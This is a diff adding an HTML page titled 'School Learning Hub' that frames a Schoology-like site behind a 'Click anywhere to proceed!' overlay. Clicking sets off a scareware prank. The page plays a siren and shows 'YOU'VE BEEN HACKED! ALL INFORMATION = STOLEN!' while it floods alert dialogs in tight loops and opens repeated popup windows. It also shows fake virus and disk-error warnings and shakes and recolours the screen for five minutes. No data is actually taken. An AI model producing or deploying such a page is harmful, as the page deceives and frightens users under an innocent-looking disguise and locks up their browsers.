@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>School Learning Hub</title>
+    <style>
+        /* Existing styles */
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            color: white;
+            background-color: red; 
+            position: relative;
+            height: 100vh; 
+            transition: background-color 0.5s; 
+        }
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 0; 
+        }
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8); 
+            z-index: 1; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            color: white;
+            font-size: 32px;
+            pointer-events: auto; 
+        }
+        .hidden {
+            display: none; 
+        }
+        #hackMessage {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 72px; 
+            text-align: center;
+            display: none;
+            animation: blink 1s infinite;
+            z-index: 10;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        #finalGif {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+            z-index: 15;
+        }
+        @keyframes shake {
+            0% { transform: translate(0, 0); }
+            25% { transform: translate(-5px, 0); }
+            50% { transform: translate(5px, 0); }
+            75% { transform: translate(-5px, 0); }
+            100% { transform: translate(0, 0); }
+        }
+    </style>
+</head>
+<body>
+    <iframe src="https://home-schoology.netlify.app" sandbox="allow-same-origin allow-scripts"></iframe>
+    <div class="overlay" id="clickOverlay">Click anywhere to proceed!</div>
+    <div id="hackMessage">YOU'VE BEEN HACKED! <br> ALL INFORMATION = STOLEN!</div>
+    <img id="finalGif" src="https://motionarray-portfolio.imgix.net/preview-1286707-BaGED8-high_17.jpg?w=660&q=60&fit=max&auto=format" alt="Final GIF" />
+    <audio id="sirenAudio" preload="auto">
+        <source src="https://freesound.org/data/previews/202/202048_2485757-lq.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        let popUpInterval; 
+        let chaosInterval;
+        let titleChangeInterval;
+        let backgroundChangeInterval;
+        let cursorMoveInterval;
+        let screenShakeInterval; 
+        let alertInterval;
+
+        document.getElementById('clickOverlay').addEventListener('click', function() {
+            this.classList.add('hidden');
+            var sirenAudio = document.getElementById('sirenAudio');
+            sirenAudio.currentTime = 0; 
+            sirenAudio.play().catch(error => {
+                console.error("Error playing audio:", error);
+            });
+
+            const hackMessage = document.getElementById('hackMessage');
+            hackMessage.style.display = 'block';
+
+            // Start alerts that declare hacking at 50 times per second
+            infiniteAlerts(); 
+
+            // Set background color to black
+            document.body.style.backgroundColor = 'black';
+
+            playPopupSimulation();
+            randomCursorMovement();
+            startScreenShake(); 
+
+            chaosInterval = setInterval(() => {
+                showRandomErrorMessage();
+            }, 500);
+
+            titleChangeInterval = setInterval(() => {
+                document.title = "Hacked! " + Math.random().toString(36).substring(7);
+            }, 1000);
+
+            backgroundChangeInterval = setInterval(() => {
+                document.body.style.backgroundColor = getRandomColor();
+            }, 300);
+
+            setTimeout(() => {
+                document.getElementById('finalGif').style.display = 'block';
+                clearInterval(chaosInterval); 
+                clearInterval(popUpInterval);
+                clearInterval(titleChangeInterval);
+                clearInterval(backgroundChangeInterval);
+                clearInterval(cursorMoveInterval);
+                clearInterval(screenShakeInterval);
+                clearInterval(alertInterval); // Clear the alert interval
+            }, 300000); // Stop the chaos after 5 minutes
+        });
+
+        function showRandomErrorMessage() {
+            const errorMessages = [
+                "Disk error: Unable to read data!",
+                "Virus detected: Immediate action required!",
+                "System crash: Reboot necessary!",
+                "File not found: Your data may be lost!",
+                "Warning: Your files are at risk of corruption!"
+            ];
+            const randomMessage = errorMessages[Math.floor(Math.random() * errorMessages.length)];
+            alert(randomMessage); 
+        }
+
+        function playPopupSimulation() {
+            popUpInterval = setInterval(startPopUpSimulation, 100); 
+        }
+
+        function startPopUpSimulation() {
+            for (let i = 0; i < 10; i++) { 
+                try {
+                    const popUp = window.open("about:blank", "_blank"); 
+                    popUp.document.write(`<h2 style="color: red;">WARNING: Your system has been hacked!</h2>`);
+                    popUp.document.close();
+
+                    setTimeout(() => {
+                        popUp.close();
+                    }, 3000); 
+                } catch (e) {
+                    console.error("Popup blocked or error occurred:", e);
+                }
+            }
+        }
+
+        function infiniteAlerts() {
+            alertInterval = setInterval(() => {
+                for (let i = 0; i < 50; i++) { // Show 50 alerts
+                    alert("YOU HAVE BEEN HACKED!!!!");
+                }
+            }, 20); // Display alerts every 20 milliseconds
+        }
+
+        function randomCursorMovement() {
+            cursorMoveInterval = setInterval(() => {
+                const x = Math.random() * window.innerWidth;
+                const y = Math.random() * window.innerHeight;
+                window.scrollTo(x, y);
+            }, 500); // Move the cursor every 500 milliseconds
+        }
+
+        function startScreenShake() {
+            screenShakeInterval = setInterval(() => {
+                document.body.style.animation = "shake 0.1s ease";
+                setTimeout(() => {
+                    document.body.style.animation = ""; // Clear animation
+                }, 100);
+            }, 500); // Shake every 0.5 seconds
+        }
+
+        function getRandomColor() {
+            const letters = '0123456789ABCDEF';
+            let color = '#';
+            for (let i = 0; i < 6; i++) {
+                color += letters[Math.floor(Math.random() * 16)];
+            }
+            return color;
+        }
+
+    </script>
+</body>
+</html>
